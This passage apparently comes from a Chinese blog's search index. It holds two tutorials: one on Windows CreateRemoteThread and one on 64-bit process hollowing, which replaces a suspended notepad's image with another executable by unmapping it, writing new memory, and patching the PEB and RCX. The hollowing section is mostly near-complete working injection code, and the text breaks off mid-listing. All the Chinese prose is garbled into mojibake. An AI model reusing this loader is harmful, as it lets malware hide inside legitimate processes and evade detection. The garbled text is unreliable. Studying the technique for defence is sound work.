12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6.Thread 2 End9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57. 60. 63. 66. 69.Thread 1 End çº¿ç¨‹1å¼€å§‹åï¼Œiä¼šä¸æ–­å¢åŠ ï¼Œç„¶åï¼Œå½“çº¿ç¨‹2å¼€å§‹åï¼Œiè¶…è¿‡20ä¾¿ä¼šè¢«æ¸…é›¶ã€‚çº¿ç¨‹2ç»“æŸåï¼Œiåˆä¼šä¸æ–­å¢åŠ ï¼Œè€Œä¸ä¼šè¢«æ¸…é›¶ã€‚ åˆ›å»ºè¿œç¨‹çº¿ç¨‹åœ¨Windowsä¸­ï¼Œè¿›ç¨‹é™¤äº†å¯ä»¥ç»™è‡ªå·±åˆ›å»ºçº¿ç¨‹ï¼Œè¿˜å¯ä»¥ç»™å…¶ä»–è¿›ç¨‹åˆ›å»ºçº¿ç¨‹ï¼Œè¿™å°±æ˜¯è¿œç¨‹çº¿ç¨‹ã€‚åˆ›å»ºè¿œç¨‹çº¿ç¨‹éœ€è¦ç”¨åˆ°CreateRemoteThreadå‡½æ•°ã€‚ CreateRemoteThreadå‡½æ•°123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); å’ŒCreateThreadç›¸æ¯”ï¼Œåªå¤šäº†ä¸€ä¸ªhProcesså‚æ•°ï¼Œè¡¨ç¤ºç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ã€‚æ­¤å¤–ï¼Œè¿™é‡Œçš„lpStartAddressæŒ‡çš„æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥åœ¨æ­£å¸¸ä½¿ç”¨æ—¶ï¼Œè¿œç¨‹çº¿ç¨‹çš„ä»£ç æ˜¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æœ¬æ¥å°±æœ‰çš„ã€‚ å‚æ•°çš„è¯¦ç»†è§£é‡Šå¯ä»¥æŸ¥çœ‹Microsoftçš„æ–‡æ¡£ï¼š CreateRemoteThread function (processthreadsapi.h) æ¥ä¸‹æ¥ï¼Œç¼–å†™ä¸€ä¸ªç®€å•ç¤ºä¾‹æ¥è¯´æ˜è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•ã€‚ ç¼–å†™ç›®æ ‡ç¨‹åºç›®æ ‡è¿›ç¨‹çš„ä»£ç ä¸­é¦–å…ˆè¿˜æ˜¯è®¾ç½®ä¸€ä¸ªå…¨å±€å˜é‡iï¼Œç„¶åæ˜¯mainå‡½æ•°ï¼š 12345678int main() { printf(&quot;Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); } return 0;} mainå‡½æ•°é¦–å…ˆä¼šæ‰“å°è‡ªèº«çš„Process IDï¼Œç„¶åå°±ä¼šä¸æ–­åœ°è®©å…¨å±€å˜é‡iåŠ ä¸€ï¼Œå¹¶æ‰“å°å‡ºæ¥ã€‚ æ¥ä¸‹æ¥ï¼Œå†ç¼–å†™ä¸€ä¸ªå‡½æ•°thread_funcï¼š 12345678int thread_func() { while(1) { if(i &gt; 20) { i = 0; } Sleep(600); }} ç”±äºmainå‡½æ•°ä¸­å¹¶æ²¡æœ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå› æ­¤æ­£å¸¸è¿è¡Œç›®æ ‡ç¨‹åºï¼Œå…¨å±€å˜é‡iå¹¶ä¸ä¼šæ¸…é›¶ã€‚ 123&gt; programProcess ID: 140320. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. ç¼–å†™ç¨‹åºä¸ºç›®æ ‡è¿›ç¨‹å¼€å¯è¿œç¨‹çº¿ç¨‹é¦–å…ˆé€šè¿‡åæ±‡ç¼–å·¥å…·ï¼ˆå¦‚IDA Proï¼‰è·å–ç›®æ ‡ç¨‹åºä¸­thread_funcçš„èµ·å§‹åœ°å€ã€‚æˆ‘çš„æœºå™¨ä¸Šthread_funcèµ·å§‹åœ°å€ä¸º0x401550ã€‚ ç„¶åå°±å¯ä»¥ç¼–å†™åˆ›å»ºè¿œç¨‹çº¿ç¨‹çš„ä»£ç ï¼š 1234567891011121314151617181920212223#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) { if(argc &lt; 0) { return -1; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;Open Process Failed! (%d)\\n&quot;, GetLastError()); return -1; } //programä¸­thread_funcèµ·å§‹åœ°å€ä¸º0x401550 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 0x401550, NULL, 0, NULL); if(NULL == hThread) { printf(&quot;Create Thread Failed! (%d)\\n&quot;, GetLastError()); return -1; } CloseHandle(hProcess); CloseHandle(hThread); return 0;} é¦–å…ˆé€šè¿‡OpenProcessè·å–ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ã€‚ç„¶åï¼Œå†å°†ç›®æ ‡è¿›ç¨‹å¥æŸ„ã€thread_funcèµ·å§‹å†…å­˜åœ°å€ç­‰å‚æ•°ä¼ å…¥CreateRemoteThreadå½“ä¸­ã€‚è¿™æ ·å°±å¯ä»¥åœ¨ç›®æ ‡è¿›ç¨‹ä¸­å¼€å¯è¿œç¨‹çº¿ç¨‹æ‰§è¡Œthread_funcä¸­çš„ä»£ç äº†ã€‚ è¿è¡Œç»“æœé¦–å…ˆè¿è¡Œç›®æ ‡ç¨‹åºprogramï¼Œå¾—çŸ¥å…¶è¿›ç¨‹IDä¸º16500ï¼Œç„¶åå†è¿è¡Œremotethread 16500ï¼Œremotethreadç¨‹åºå°±å¯ä»¥æ ¹æ®16500è·å–ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ï¼Œè¿›è€Œä¸ºç›®æ ‡ç¨‹åºå¼€å¯è¿œç¨‹çº¿ç¨‹ã€‚æ–°çš„çº¿ç¨‹å°±ä¼šè¿è¡Œthread_funcå‡½æ•°ä¸­çš„ä»£ç ï¼Œä»è€Œå®ç°å¯¹å…¨å±€å˜é‡iæ¸…é›¶çš„æ“ä½œã€‚ä¹‹åï¼Œremotethreadè¿›ç¨‹é€€å‡ºäº†ï¼Œä½†ç”±äºthread_funcçº¿ç¨‹æ˜¯å±äºprogramè¿›ç¨‹çš„ï¼Œå› æ­¤ä»ç„¶ä¼šç»§ç»­è¿è¡Œï¼Œiä¼šç»§ç»­è¢«æ¸…é›¶ã€‚ 12345678&gt; programProcess ID: 165000. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 58. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22.","link":"/2021/01/20/windows-thread-remote-thread/"},{"title":"Process Hollowingåœ¨64ä½è¿›ç¨‹ä¸­çš„ç®€å•å®ç°","text":"é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€çš„åˆæ³•è¿›ç¨‹ï¼ˆæ¯”å¦‚notepadè¿›ç¨‹ï¼‰ï¼Œç„¶åå†ä½¿ç”¨ZwUnmapViewOfSectionæˆ–NtUnmapViewOfSectionå°†åˆæ³•çš„notepadæ¨¡å—å æ®çš„å†…å­˜ç©ºé—´ç»™unmapæ‰ã€‚æ¥ä¸‹æ¥ï¼Œå‘notepadçš„å†…å­˜ç©ºé—´ä¸­å†™å…¥æ¶æ„çš„PEæ–‡ä»¶ï¼Œå¹¶é€šè¿‡ä¿®æ”¹è¿›ç¨‹çš„contextï¼Œå°†å…¥å£ç‚¹æ”¹ä¸ºæ¶æ„PEæ–‡ä»¶çš„å…¥å£ç‚¹ã€‚æœ€åï¼Œä½¿ç”¨ResumeThreadä½¿notepadæ¢å¤æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°åœ¨notepadè¿›ç¨‹ç©ºé—´ä¸­è¿è¡Œæ¶æ„PEæ–‡ä»¶çš„æ•ˆæœã€‚è¿™ç§æ–¹æ³•å°±æ˜¯Process Hollowingã€‚ æœ¬æ–‡å¤§é‡å‚è€ƒLeitch, J. (n.d.). Process Hollowing.è¿™ç¯‡æ–‡ç« ã€‚ è·å–ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„PEæ–‡ä»¶Process Hollowingéœ€è¦å°†ä¸€ä¸ªPEæ–‡ä»¶æ‰‹åŠ¨åŠ è½½åˆ°å…¶ä»–è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ã€‚å› æ­¤ï¼Œé¦–å…ˆè¦è·å–ä¸€ä¸ªPEæ–‡ä»¶ã€‚æ ¹æ®Leitch, J. (n.d.). Process Hollowing.è¿™ç¯‡æ–‡ç« çš„è¯´æ³•ï¼ŒPEæ–‡ä»¶éœ€è¦æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š To successfully perform process hollowing the source image must meet a few requirements: To maximize compatibility, the subsystem of the source image should be set to windows. The compiler should use the static version of the run-time library to remove dependence to the Visual C++ runtime DLL. This can be achieved by using the /MT or /MTd compiler options. Either the preferred base address (assuming it has one) of the source image must match that of the destination image, or the source must contain a relocation table and the image needs to be rebased to the address of the destination. For compatibility reasons the rebasing route is preferred. The /DYNAMICBASE or /FIXED:NO linker options can be used to generate a relocation table. é¦–å…ˆï¼Œä¸ºäº†å¢å¼ºPEæ–‡ä»¶çš„å…¼å®¹æ€§ï¼Œsubsysteméœ€è¦è®¾ä¸ºwindowsã€‚åœ¨å®é™…æ“ä½œä¸­ï¼Œæˆ‘å‘ç°å¦‚æœsubsystemè®¾ç½®æˆäº†consoleï¼Œåˆ™PEæ–‡ä»¶æ— æ³•æ³¨å…¥Windowsçª—å£ç¨‹åºï¼ˆå¦‚notepadï¼Œcalcï¼‰ï¼Œåªèƒ½æ³¨å…¥æ§åˆ¶å°ç¨‹åºï¼ˆå¦‚cmdï¼‰ã€‚ å¦å¤–ï¼ŒPEæ–‡ä»¶ä¸åº”è¯¥ä¾èµ–Visual C++ runtime DLLï¼Œè¿™å¯ä»¥é€šè¿‡åœ¨ç¼–è¯‘æ—¶ä½¿ç”¨/MTæˆ–/MTdé€‰é¡¹è§£å†³ã€‚ æœ€åï¼Œå¦‚æœPEæ–‡ä»¶æ— æ³•åŠ è½½åˆ°é¢„å®šçš„åŸºåœ°å€ï¼Œè¿˜éœ€è¿›è¡Œé‡å®šä½æ“ä½œã€‚ä¸è¿‡æœ¬æ–‡åªè€ƒè™‘PEæ–‡ä»¶å¯ä»¥åŠ è½½åˆ°é¢„å®šåŸºåœ°å€çš„æƒ…å†µï¼Œå› æ­¤ä¸ä¼šè¿›è¡Œé‡å®šä½çš„æ“ä½œã€‚ æ ¹æ®ä¸Šè¿°ä¸‰ä¸ªè¦æ±‚ï¼Œç¼–å†™å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int WinMain() { srand(time(NULL)); char str1[20]; sprintf(str1, &quot;Current pid: %d&quot;, GetCurrentProcessId()); char str2[20]; int i; while(i = rand() % 100) { sprintf(str2, &quot;%d &gt; 0&quot;, i); MessageBoxA(NULL, str1, str2, MB_ICONERROR | MB_OK); } return 0;} ç„¶åä½¿ç”¨Visual Studioçš„å‘½ä»¤è¡Œå·¥å…·ç¼–è¯‘ï¼š 123456789101112131415161718&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /MT source.c /link /subsystem:windowsç”¨äº x64 çš„ Microsoft (R) C/C++ ä¼˜åŒ–ç¼–è¯‘å™¨ 19.28.29336 ç‰ˆç‰ˆæƒæ‰€æœ‰(C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚source.csource.c(7): warning C4026: ä½¿ç”¨å½¢å‚è¡¨å£°æ˜çš„å‡½æ•°Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:source.exe/subsystem:windowssource.obj æ ¹æ®PEæ–‡ä»¶å†…å®¹å°†å…¶åŠ è½½åˆ°å†…å­˜å‡è®¾å·²ç»å°†PEæ–‡ä»¶å…¨éƒ¨è¯»å…¥å†…å­˜ï¼Œå¹¶ä¸”ä¿å­˜åˆ°äº†ä¸€ä¸ªbufæ•°ç»„å½“ä¸­ï¼Œç°åœ¨è¦è·å–å…¶è£…å…¥å†…å­˜åçš„æƒ…å†µï¼Œå¹¶ä¸”ä¿å­˜åœ¨å¦ä¸€ä¸ªæ•°ç»„memä¸­ã€‚ é¦–å…ˆï¼Œæ‰¾åˆ°e_lfanewï¼Œå¹¶æ®æ­¤å®šä½åˆ°å…¶NTæ˜ åƒå¤´ï¼š 1234//è¯»å–DOSæ–‡ä»¶å¤´ï¼Œè·å–e_lfanewPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0];//è·å–æ˜ åƒå¤´PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; NTæ˜ åƒå¤´ä¸­åŒ…å«ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚å¯æ‰§è¡Œæ–‡ä»¶é»˜è®¤è£…å…¥çš„åœ°å€ImageBaseï¼Œè£…å…¥å†…å­˜åæ˜ åƒçš„æ€»å°ºå¯¸SizeOfImageï¼Œç¨‹åºå…¥å£ç‚¹AddressOfEntryPointç­‰ã€‚æ ¹æ®SizeOfImageå°±å¯ä»¥çŸ¥é“éœ€è¦å¤šå¤§çš„å†…å­˜æ¥ä¿å­˜PEæ–‡ä»¶è£…å…¥å†…å­˜çš„çŠ¶æ€ï¼Œè€ŒImageBaseå’ŒAddressOfEntryPointåˆ™åœ¨åé¢çš„æ“ä½œéœ€è¦ç”¨åˆ°ï¼š 12345//æ ¹æ®å¯é€‰å¤´çš„SizeOfImageåˆ†é…å†…å­˜unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1);(*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase;(*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint;(*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; NTæ˜ åƒå¤´ä¸­è¿˜åŒ…å«ä¸€ä¸ªSizeOfHeadersï¼Œæ ¹æ®è¿™ä¸€æ•°æ®å°†PEæ–‡ä»¶çš„å¤´éƒ¨å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼š 12//å°†æ–‡ä»¶å¤´å¤åˆ¶åˆ°å†…å­˜ä¸­memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); æœ€åï¼Œæ ¹æ®èŠ‚è¡¨åŒ…å«çš„ä¿¡æ¯å°†æ¯ä¸€èŠ‚ä¾æ¬¡è£…è½½åˆ°å†…å­˜ä¸­çš„ç‰¹å®šä½ç½®ï¼š 12345678910//è·å–èŠ‚è¡¨èµ·å§‹ä½ç½®PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader];//å°†æ¯ä¸€èŠ‚çš„å†…å®¹ä¾æ¬¡å¤åˆ¶åˆ°å†…å­˜ä¸­for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData);} å°†ä¸Šè¿°è¿‡ç¨‹å†™æˆload_pe64å‡½æ•°ï¼Œå…¶å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //è¯»å–DOSæ–‡ä»¶å¤´ï¼Œè·å–e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //è·å–æ˜ åƒå¤´ PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //æ ¹æ®å¯é€‰å¤´çš„SizeOfImageåˆ†é…å†…å­˜ unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //è·å–èŠ‚è¡¨èµ·å§‹ä½ç½® PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //å°†æ–‡ä»¶å¤´å¤åˆ¶åˆ°å†…å­˜ä¸­ memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //å°†æ¯ä¸€èŠ‚çš„å†…å®¹ä¾æ¬¡å¤åˆ¶åˆ°å†…å­˜ä¸­ for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;} ç¼–å†™ç¨‹åºå®ç°Process Hollowingåˆ›å»ºæŒ‚èµ·çš„notepadè¿›ç¨‹åˆ›å»ºæŒ‚èµ·çŠ¶æ€çš„å­è¿›ç¨‹åªéœ€è¦åœ¨CreateProcessAçš„æ—¶å€™åŠ ä¸€å¥CREATE_SUSPENDEDå°±è¡Œäº†ã€‚ 12345678910111213141516171819//åˆ›å»ºæŒ‚èµ·çš„notepadè¿›ç¨‹STARTUPINFO si = {0};PROCESS_INFORMATION pi = {0};si.cb = sizeof(si);BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); è·å–notepadåŠ è½½çš„åŸºåœ°å€è¿›ç¨‹çœŸå®åŠ è½½çš„åœ°å€éœ€è¦ä»PEBä¸­æ‰¾åˆ°ï¼Œæ‰€ä»¥å…ˆè¦æ‰¾åˆ°PEBçš„åŸºåœ°å€ã€‚ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡NtQueryInformationProcessæ‰¾åˆ°PEBåŸºåœ°å€ã€‚ 1234//è·å–notepadè¿›ç¨‹çš„PEBåœ°å€PROCESS_BASIC_INFORMATION processInfo;NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL);printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); å¦‚æœæŸ¥çœ‹å¾®è½¯å…³äºPEBçš„å®˜æ–¹æ–‡æ¡£ï¼Œä¼šå‘ç°PEBä¸­å¾ˆå¤šé¡¹éƒ½æ˜¯Reservedã€‚è¦æƒ³çŸ¥é“PEBä¸­æ¯ä¸€é¡¹çœŸå®çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åœ¨åˆ«çš„ç½‘ç«™ä¸Šçœ‹ï¼š PEB (Process Enviroment Block) ç„¶åå°±å¯ä»¥å‘ç°ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­çš„Reserved3[1]è¿™ä¸€é¡¹å®é™…ä¸Šå°±æ˜¯ImageBaseAddressï¼Œæ®æ­¤å°±å¯ä»¥æ‰¾åˆ°notepadæ¨¡å—çš„åŸºåœ°å€ï¼š 123456//PEBçš„Reserved3[1]å°±æ˜¯notepadè¿›ç¨‹åŠ è½½çš„åŸºåœ°å€PEB processPeb;result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);void *originImageBase = processPeb.Reserved3[1];printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase);system(&quot;pause&quot;); çŸ¥é“äº†notepadçš„åŸºåœ°å€åï¼Œå°±å¯ä»¥é€šè¿‡NtUnmapViewOfSectionå°†notepadå æ®çš„å†…å­˜ç»™unmapæ‰äº†ï¼š 123456//unmapåˆæ³•å†…å­˜çš„ä»£ç DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase);if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1;} å°†PEæ–‡ä»¶åŠ è½½åˆ°notepadå†…å­˜ç©ºé—´ä¸­å°†æƒ³è¦åŠ è½½çš„PEæ–‡ä»¶è¯»å…¥å†…å­˜ï¼š 12345678910111213141516//è¯»å–source.exeæ–‡ä»¶ï¼Œå°†PEæ–‡ä»¶å†…å®¹å…¨éƒ¨æ”¾å…¥å†…å­˜FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;);if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1;}fseek(fptr, 0L, SEEK_END);long fileSize = ftell(fptr);rewind(fptr);BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000);if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1;}fread(fileBuf, 1, fileSize, fptr);fclose(fptr); ç„¶åï¼Œè°ƒç”¨ä¹‹å‰å†™çš„load_pe64å‡½æ•°ï¼Œå°†PEæ–‡ä»¶æŒ‰ç…§æ–‡ä»¶ç»“æ„è½½å…¥å†…å­˜ä¸­ï¼š 1234567//æ ¹æ®PEæ–‡ä»¶å†…å®¹ç”ŸæˆPEæ–‡ä»¶è½½å…¥å†…å­˜çš„çŠ¶æ€int ImageSize;ULONGLONG newImageBase;DWORD entryPoint;unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint);printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); æœ€åï¼Œä½¿ç”¨WriteProcessMemoryï¼Œå°†è¿™å—å†…å­˜å†™åˆ°notepadçš„å†…å­˜ç©ºé—´ä¸­ï¼š 1234567891011121314151617//VirtualAllocExç”³è¯·ä¸€å—å†…å­˜åŠ è½½source.exevoid *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1;}//å°†source.exeå†™å…¥notepadè¿›ç¨‹ç©ºé—´ä¸­result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL);free(peMem);free(fileBuf);if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1;} ç”±äºæ²¡æœ‰è¿›è¡Œé‡å®šä½æ“ä½œï¼Œè¿™é‡Œç”³è¯·çš„å†…å­˜èµ·å§‹åœ°å€å¿…é¡»ä¸ºå¯æ‰§è¡Œæ–‡ä»¶é»˜è®¤è£…å…¥çš„å†…å­˜åœ°å€ï¼Œå³PEæ–‡ä»¶ä¸­çš„ImageBaseã€‚ PEBä¸­çš„ImageBaseAddressè¿™ä¸€é¡¹ä¹Ÿå¾—è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ï¼š 1234567//ä¿®æ”¹PEBä¸­çš„ImageBaseprocessPeb.Reserved3[1] = (PVOID)newImageBase;result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1;} ä¿®æ”¹è¿›ç¨‹çš„contextCONTEXTç»“æ„ä½“ä¸­å­˜å‚¨äº†ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®notepadè¿›ç¨‹çš„contextè®¾ç½®å®ƒçš„å¯„å­˜å™¨çš„å€¼ã€‚ å½“è¿›ç¨‹ä»¥æŒ‚èµ·çŠ¶æ€è¢«åˆ›å»ºæ—¶ï¼Œå®ƒçš„å…¥å£ç‚¹è¢«å­˜å‚¨åœ¨äº†å¯„å­˜å™¨å½“ä¸­ã€‚åœ¨32ä½è¿›ç¨‹ä¸­ï¼Œå­˜å‚¨å…¥å£ç‚¹çš„å¯„å­˜å™¨ä¸ºEAXï¼Œæ‰€ä»¥Leitch, J. (n.d.). Process Hollowing.è¿™ç¯‡æ–‡ç« ä¼šè®¾ç½®CONTEXTç»“æ„ä½“ä¸­çš„Eaxè¿™ä¸€é¡¹ã€‚ åœ¨64ä½è¿›ç¨‹ä¸­ï¼Œå­˜å‚¨å…¥å£ç‚¹çš„å¯„å­˜å™¨å˜æˆäº†RCXã€‚å¯ä»¥åœ¨åˆ›å»ºäº†æŒ‚èµ·çš„notepadè¿›ç¨‹åï¼Œä½¿ç”¨x64dbgé™„åŠ åˆ°è¿™ä¸ªè¿›ç¨‹ä¸Šï¼Œçœ‹ä¸€ä¸‹å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼š å…¶ä¸­RCXçš„å€¼å°±æ˜¯&lt;notepad.EntryPoint&gt;ã€‚ ç”±äºPEæ–‡ä»¶å·²ç»åŠ è½½åˆ°äº†notepadå†…å­˜ç©ºé—´ä¸­ï¼ŒEntryPointä¹Ÿå‘ç”Ÿäº†ç›¸åº”çš„å˜åŒ–ï¼Œæ•…éœ€è¦å¯¹RCXå¯„å­˜å™¨çš„å€¼è¿›è¡Œä¿®æ”¹ï¼š 1234567891011121314//ä¿®æ”¹notepadè¿›ç¨‹çš„contextï¼Œå°†å…¥å£ç‚¹(rcxå¯„å­˜å™¨)è®¾ç½®ä¸ºsource.exeçš„å…¥å£ç‚¹CONTEXT targetContext;targetContext.ContextFlags = CONTEXT_FULL;result = GetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;}targetContext.Rcx = newImageBase + entryPoint;result = SetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;} è®©æŒ‚èµ·çš„notepadæ¢å¤è¿è¡Œæœ€åï¼Œä½¿ç”¨ResumeThreadæ¢å¤notepadçš„è¿è¡Œï¼š 1234ResumeThread(pi.hThread);printf(&quot;Injected!\\n&quot;);WaitForSingleObject(pi.hThread, INFINITE);printf(&quot;Wait Complete!\\n&quot;); ç„¶åå°±èƒ½å‘ç°ï¼Œè¿è¡Œçš„å¹¶ä¸æ˜¯notepadç¨‹åºï¼Œè€Œæ˜¯ä¸€ä¸ªå¼¹çª—ç¨‹åºï¼Œè¿™å°±è¯´æ˜æˆåŠŸè¿›è¡Œäº†è¿›ç¨‹çš„æ›¿æ¢ã€‚ å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //è¯»å–DOSæ–‡ä»¶å¤´ï¼Œè·å–e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //è·å–æ˜ åƒå¤´ PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //æ ¹æ®å¯é€‰å¤´çš„SizeOfImageåˆ†é…å†…å­˜ unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = 